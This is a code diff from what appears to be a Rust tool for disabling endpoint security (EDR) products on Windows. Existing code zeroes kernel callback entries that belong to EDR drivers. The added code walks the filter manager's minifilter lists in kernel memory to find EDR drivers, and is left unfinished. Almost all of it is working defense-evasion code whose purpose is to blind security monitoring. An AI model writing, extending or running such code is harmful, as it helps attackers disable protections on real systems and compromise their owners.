@@ -113,7 +113,7 @@ pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u6
                 addr, func_addr, drv_name
             );
             if km::is_driver_name_matching_edr(&drv_name) {
-                println!("[|]                `------> Entry matches EDR ({}). Removing...", drv_name);
+                println!("[|]                             `-> matches EDR: {}. Removing...", drv_name);
                 write_qword(addr, 0x00);
             }
         }
@@ -159,9 +159,54 @@ pub fn nerf_etw_prov(
 ///     pub flt_instance_callbacknodes: u64,
 ///     pub flt_instance_filterlink: u64
 /// }  
-///
-pub fn nerf_fs_miniflts(fm_offsets: pdb::FmOffsets) -> windows::core::Result<()> {
-    println!("[|] FltGlobals offset: 0x{:x}", fm_offsets.flt_globals);
-    
+pub fn nerf_fs_miniflts(fm_base: u64, offsets: pdb::FmOffsets) -> windows::core::Result<()> {
+    let mut edr_cb_found: bool = false;
+
+    // frame_list_header = fltmgr_base + FltGlobals + _GLOBALS_FrameList + _FLT_RESOURCE_LIST_HEAD_rList;
+    let frame_list_header: u64 = fm_base 
+        + offsets.flt_globals 
+        + offsets.globals_framelist 
+        + offsets.flt_resource_list_head_rlist;
+
+
+    let mut current_frame_shifted = mem::read_qword(frame_list_header)?;
+    println!("[|] Frame list header at [0x{:16x}]: 0x{:16x}", frame_list_header, current_frame_shifted);
+
+    while current_frame_shifted != frame_list_header {
+        let current_frame = current_frame_shifted - offsets.fltp_frame_links;
+        
+        println!("[|]   Walking minifilter frame at _FLTP_FRAME: 0x{:016x}", current_frame);
+        
+        let filter_list_header = current_frame 
+            + offsets.fltp_frame_registeredfilters
+            + offsets.flt_resource_list_head_rlist;
+
+        let mut current_filter_shifted = mem::read_qword(filter_list_header)?;
+        
+        while current_filter_shifted != filter_list_header {
+            println!("[|]     - Current filter: 0x{:16x}", current_filter_shifted);
+            current_filter_shifted = mem::read_qword(current_filter_shifted)?;
+            let current_filter = current_filter_shifted - offsets.flt_object_primarylink;
+
+            // Get driver info
+            let driver_object = mem::read_qword(current_filter + offsets.flt_filter_driverobject)?;
+            let driver_init = mem::read_qword(driver_object + offsets.driver_object_driverinit)?;
+
+            let mut drv_name;
+            match km::find_driver_name_from_addr(driver_init) {
+                Some(drv) => {
+                    drv_name = drv; // take ownership of the String
+                    println!("[|]       EDR driver found: {}", drv_name);
+                },
+                None => {
+                    drv_name = String::from(""); // fallback
+                }
+            }
+        }
+        
+        current_frame_shifted = mem::read_qword(current_frame_shifted)?;
+    }
+
+
     Ok(())
 }
